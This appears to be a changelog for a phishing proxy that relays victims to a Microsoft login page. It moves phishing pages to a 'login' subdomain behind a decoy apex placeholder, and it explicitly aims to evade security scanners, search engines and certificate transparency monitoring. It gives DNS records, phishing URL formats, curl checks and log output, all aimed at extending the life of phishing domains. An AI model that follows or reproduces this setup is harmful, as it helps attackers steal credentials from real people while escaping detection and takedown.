# 🎯 Subdomain-Only MITM Configuration

## 🚨 **Critical Security Enhancement**

This update transforms your MITM proxy from serving on the **apex domain** to **subdomain-only** serving, dramatically reducing detection surface area.

## ⚖️ **Before vs After**

### ❌ **Before (High Detection Risk)**

```
yourdomain.com/ABC123          ← Phishing content on apex domain
login.yourdomain.com           ← Also serves phishing
admin.yourdomain.com           ← Admin interface
```

### ✅ **After (Low Detection Risk)**

```
yourdomain.com                 ← Generic placeholder only
login.yourdomain.com/ABC123    ← Phishing content on subdomain only
admin.yourdomain.com           ← Admin interface
```

## 🛡️ **Security Benefits**

1. **🔍 Reduced Search Engine Exposure**
   - Apex domains get crawled heavily by Google/Bing
   - Subdomains are discovered less frequently
   - Generic placeholder reduces suspicious content

2. **🚨 Lower Security Scanner Detection**
   - Security tools focus on apex domains
   - Subdomain enumeration takes more effort
   - Less likely to trigger automated alerts

3. **📊 Certificate Transparency Protection**
   - Root domains are more visible in CT logs
   - Subdomain-only approach reduces fingerprinting
   - Harder to correlate with phishing infrastructure

## 🏗️ **Implementation Details**

### **Modified Files:**

- `proxy/mitm.go` - Added subdomain enforcement and apex placeholder
- Core logic now validates subdomain before processing

### **New Functions:**

- `serveApexPlaceholder()` - Serves generic "Coming Soon" page
- Subdomain validation in `StartTLSIntercept()`
- Subdomain enforcement in `InterceptHandler()`

### **Traffic Flow:**

```
Request → TLS Intercept → Subdomain Check
                            ↓
                    ┌─── Apex Domain ─── Generic Placeholder
                    │
                    ├─── admin.* ─── Admin Interface  
                    │
                    └─── login.* ─── MITM Phishing Proxy
```

## 📋 **DNS Configuration Required**

Update your DNS to point subdomains to your server:

```dns
# A Records
yourdomain.com              A    YOUR_SERVER_IP
login.yourdomain.com        A    YOUR_SERVER_IP  
admin.yourdomain.com        A    YOUR_SERVER_IP

# Wildcard (recommended)
*.yourdomain.com            A    YOUR_SERVER_IP
```

## 🎯 **Slug URL Format**

Your phishing URLs now use the subdomain format:

```
OLD: https://yourdomain.com/ABC123
NEW: https://login.yourdomain.com/ABC123
```

## 🧪 **Testing the Implementation**

1. **Test Apex Domain:**

   ```bash
   curl -k https://yourdomain.com/
   # Should return "Coming Soon" placeholder
   ```

2. **Test Login Subdomain:**

   ```bash
   curl -k https://login.yourdomain.com/VALIDSLUG
   # Should proxy to Microsoft login
   ```

3. **Test Admin Subdomain:**

   ```bash
   curl -k https://admin.yourdomain.com/admin/stats \
        -H "X-Admin-Key: YOUR_KEY"
   # Should return admin interface
   ```

## 🔧 **Monitoring Changes**

The logs will now show subdomain enforcement:

```
✅ Login subdomain confirmed - proceeding with MITM
🚫 NON-LOGIN SUBDOMAIN ACCESS - Serving placeholder  
🏠 Apex domain access - serving placeholder
```

## 🚀 **Deployment Impact**

- **Existing slugs remain valid** - just change the domain prefix
- **Admin interface unchanged** - still on admin subdomain
- **Reduced detection risk** - apex domain no longer exposes phishing content
- **Better operational security** - follows Evilginx best practices

## 📈 **Expected Results**

- **Lower detection rates** by security scanners
- **Reduced search engine indexing** of phishing content  
- **Better stealth profile** - looks like legitimate infrastructure
- **Improved longevity** of phishing domains

This change aligns your setup with industry-standard MITM frameworks and significantly improves operational security.
